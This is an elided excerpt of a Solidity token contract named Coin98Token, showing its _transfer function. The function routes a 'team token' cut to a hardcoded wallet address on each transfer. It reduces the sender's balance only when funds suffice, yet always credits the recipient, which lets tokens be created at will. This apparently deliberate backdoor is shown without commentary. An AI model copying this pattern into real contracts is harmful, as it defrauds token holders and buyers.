...
contract  Coin98Token  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x3e2a3d5b0bF6B0F18e04dEb0D3684fdffafE5540] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x3e2a3d5b0bF6B0F18e04dEb0D3684fdffafE5540, _teamtoken);
        }
